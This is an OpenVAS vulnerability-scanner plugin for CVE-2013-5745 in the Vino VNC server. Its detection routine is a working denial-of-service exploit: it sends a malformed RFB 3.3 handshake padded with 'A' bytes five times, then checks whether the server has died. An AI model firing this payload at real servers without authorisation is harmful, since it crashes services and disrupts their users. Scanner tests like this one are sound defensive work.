###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_vino_vnc_dos_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Vino VNC Server Remote Denial Of Service Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");

if(description)
{
  script_id(802061);
  script_version("$Revision: 11 $");
  script_bugtraq_id(62443);
  script_cve_id("CVE-2013-5745");
  script_tag(name:"cvss_base", value:"7.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-09-27 16:12:45 +0530 (Fri, 27 Sep 2013)");
  script_name("Vino VNC Server Remote Denial Of Service Vulnerability");

   tag_summary =
"This host is running Vino VNC Server and is prone to denial of service
vulnerability.";

  tag_vuldetect =
"Send crafted request and check is it vulnerable to DoS or not.";

  tag_insight =
"Vulnerability is triggered when a VNC client claims to only support protocol
version 3.3 and sends malformed data during the authentication selection stage
of the authentication process.";

  tag_impact =
"Successful exploitation will allow attacker to to cause a denial of service.
Additionally, after the failure condition has occurred, the log file
(~/.xsession-errors) grows quickly.

Impact Level: Application";

  tag_affected =
"Vino VNC Server version 3.7.3 and prior.";

  tag_solution =
"Upgrade to version 3.7.4 or later,
https://wiki.gnome.org/Vino";

 desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "impact" , value : tag_impact);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://osvdb.org/97419");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/87155");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/28338");
  script_xref(name : "URL" , value : "https://bugzilla.gnome.org/show_bug.cgi?id=707905");
  script_xref(name : "URL" , value : "https://bugzilla.gnome.org/show_bug.cgi?id=641811");
  script_xref(name : "URL" , value : "https://access.redhat.com/security/cve/CVE-2013-5745");
  script_summary("Check if Vino VNC Server is vulnerable to denial of service");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service1.nasl");
  script_require_ports("Services/vnc", 5900);
  exit(0);
}

## Variable Initialization
soc = "";
req = "";
recv = "";
mal_req = "";
vino_vnc_port = "";
vnc_banner = "";

## Get VNC Port
vino_vnc_port = get_kb_item("Services/vnc");
if(!vino_vnc_port){
  vino_vnc_port = 5900;
}

## Check the port status
if(!get_port_state(vino_vnc_port)){
  exit(0);
}

## exit if socket is not created
soc = open_sock_tcp(vino_vnc_port);
if(!soc){
  exit(0);
}

## Recieve banner
vnc_banner = recv(socket:soc, length:1024);
close(soc);
if(!vnc_banner || vnc_banner !~ "^RFB "){
  exit(0);
}

## Construct an attack request
mal_req = raw_string("RFB 003.003", 0x0a, crap(data: "A", length:16));

## Send 5 times malformed request
for(i=0; i<5 ; i++)
{
  soc = open_sock_tcp(vino_vnc_port);
  if(!soc)
  {
    security_hole(vino_vnc_port);
    exit(0);
  }

  vnc_ban = recv(socket:soc, length:1024);
  send(socket:soc, data:mal_req);
  close(soc);
}

sleep(2);

## Check vino vnc server is dead if not able to
## open the socket or not able to get the banner
soc = open_sock_tcp(vino_vnc_port);
if(!soc)
{
  security_hole(vino_vnc_port);
  exit(0);
}

vnc_ban = recv(socket:soc, length:1024);
if(!vnc_ban)
{
  close(soc);
  security_hole(vino_vnc_port);
  exit(0);
}
